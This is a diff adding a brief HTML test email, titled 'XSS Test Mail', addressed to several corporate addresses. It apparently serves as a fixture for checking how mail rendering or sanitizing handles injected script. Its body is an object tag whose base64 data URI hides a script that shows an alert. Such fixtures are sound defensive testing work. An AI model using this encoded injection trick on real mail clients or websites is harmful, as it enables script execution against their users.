@@ -1,0 +1,7 @@
+From: teb.lokey@enron.com
+To: jdasovic@enron.com, mday@gmssr.com, porterdk@sce.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFjayBieSBweDE2MjQiKTwvc2NyaXB0Pg==">
